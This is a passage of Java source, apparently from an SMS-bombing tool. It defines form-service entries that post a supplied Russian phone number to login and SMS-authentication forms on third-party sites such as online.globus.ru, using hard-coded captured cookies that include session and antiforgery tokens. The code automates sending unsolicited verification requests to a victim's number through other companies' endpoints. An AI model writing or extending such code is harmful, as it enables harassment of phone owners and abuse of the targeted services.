                        request.header("Cookie", "_ym_uid=1677588936312422059; _ym_d=1677588936; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ze_visiter=BBD44883-7DB0-4BC4-B331-D9DFF8B24051; _ze_referer=https://www.google.com/; _ze_referer_time=20230409174230; tmr_lvid=ccd00df5ac74424a769b5f262a180818; tmr_lvidTS=1681051352238; _gid=GA1.2.1372097639.1681051352; _ym_isad=2; _ym_visorc=w; _hjFirstSeen=1; _hjIncludedInSessionSample_1926565=0; _hjSession_1926565=eyJpZCI6IjIwZTRlNGUzLWYyZGEtNDU3Ny1hYmU2LTE1NzBhZmIzMWRlOCIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1ODIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1681051353018.215763853; .LoanExpress.Session=CfDJ8LfbWLtL0iJEnA0TxaiJ2NXj/r2yRlFi4x5VQREdNf5rsUkJ3yrU0uIPYDOOVYLU/C/PWLoS5/xKXvaSSq2utdGI2yjNGbF3sWP46CSPy+zQGanUtzm+5YlNbuuNf//3P/4KMx7W0tHxpoHfgndbKMI1oDvVdWhhTr9WjyyVEvam; .AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8LfbWLtL0iJEnA0TxaiJ2NV4Bc9G7NXmZcZmkkLtB2B7VGzfoEOtyG_8I9hFphEjDvJN_4Ob27RarXU-QuVoBiv1THQCjjXJcMdvm6LtB5etVecQy1OzJY5Nc3s7YTuWzIyFWE2RrGNP9utz2vYmsMA; pt_s_2f1af163=vt=1681051367413&cad=; _hjSessionUser_1926565=eyJpZCI6Ijk2MzliZmQ3LWY4M2EtNTYyZC1iNmFjLWE0ZGMzZDAzM2M1OSIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1NzAsImV4aXN0aW5nIjp0cnVlfQ==; pt_2f1af163=deviceId=b11694e8-3a40-4cd2-a0ad-55697497f002&sessionId=771fabc0-5c53-4c4e-84ca-0a96929437d7&accountId=&vn=1&pvn=2&sact=1681051368744&; _ga_2JB47PMSVE=GS1.1.1681051351.3.1.1681051369.0.0.0; _ga=GA1.2.1772293061.1677588936");

                        builder.add("CellNumber", phone.format("+7 (***) ***-**-**"));
                    }
                },

                new FormService("https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta", 7) {
                    @Override
                    public void buildBody(Phone phone) {
                        request.headers(
                                new Headers.Builder()
                                        .add("bx-ajax", "true")
                                        .add("referer", "https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta")
                                        .addUnsafeNonAscii("Cookie", "globus_hyper_id=73; areal_user_change_city=krasnogorsk; globus_hyper_name=Красногорск; _ym_uid=1664469178997278156; _ym_d=1677585277; _fbp=fb.1.1677585277552.1677594909; _gid=GA1.2.1742009735.1681051545; _ym_isad=2; _ym_visorc=w; globus_hyper_show_select=1; _source=globus.ru; url_hyper_id=5011; online_hyper_id=5011; BITRIX_SM_SALE_UID=bb2579f9d0a9f9db5049c979d5cf5464; BITRIX_SM_GUEST_ID=21741551; rrpvid=327738943289815; flocktory-uuid=2df10288-6654-490d-94b7-7ab941005cd1-7; advcake_session_id=30746353-5e1c-577e-3938-2928cdfc6d66; advcake_track_url=https://online.globus.ru/?hyper=5011&utm_source=globus.ru&utm_medium=menu&utm_campaign=online.globus.ru&utm_content=shapka-sajta; advcake_utm_partner=online.globus.ru; advcake_utm_webmaster=shapka-sajta; advcake_click_id=; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; g4c_x=1; _gcl_au=1.1.844509765.1681051553; _gasessionid=20b3d9a6-c350-45c1-a6bb-6b4d1ef7834e; gtm-session-start=1681051552603; pages_cnt=2; hypermarket=Ð“Ð»Ð¾Ð±ÑƒÑ\u0081 ÐšÑ€Ð°Ñ\u0081Ð½Ð¾Ð³Ð¾Ñ€Ñ\u0081Ðº; tmr_lvid=8b138313c85db7519bfc51951d12f393; tmr_lvidTS=1681051552987; st_uid=0639fd1ba9cd8effe5b8f5060da0d2a2; BITRIX_CONVERSION_CONTEXT_s2={\"ID\":60,\"EXPIRE\":1681073940,\"UNIQUE\":[\"conversion_visit_day\"]}; rai_new=6a6d288901a10983aa53ff2df67ac730; adrdel=1; adrcid=Ats7lVWd-xTEYAobZkom0YQ; analytic_id=1681051557269; timeSent=1; globusid=TUbN6Ig2NRhGT5emehZfeayed0RV7XmV; advcake_track_id=4c80f385-cdd2-7a8f-226f-c893466b602e; pagesCount=1; _ga_WYXVN1FFMV=GS1.1.1681051552.1.1.1681052245.60.0.0; _ga=GA1.2.66925213.1677585277; _gaclientid=66925213.1677585277; _gat_UA-6261130-10=1; tmr_detect=0|1681052248658; _gahitid=2023-04-09T17:57:31.332+03:00")
                                        .build()
                        );

                        builder
                                .add("AUTH_FORM", "Y")
                                .add("TYPE", "AUTH")
                                .add("FORM[AUTH_TYPE]", "PHONE")
                                .add("FORM[PHONE]", phone.format("+7 (***) ***-**-**"));
                    }
                }
        );
    }
}
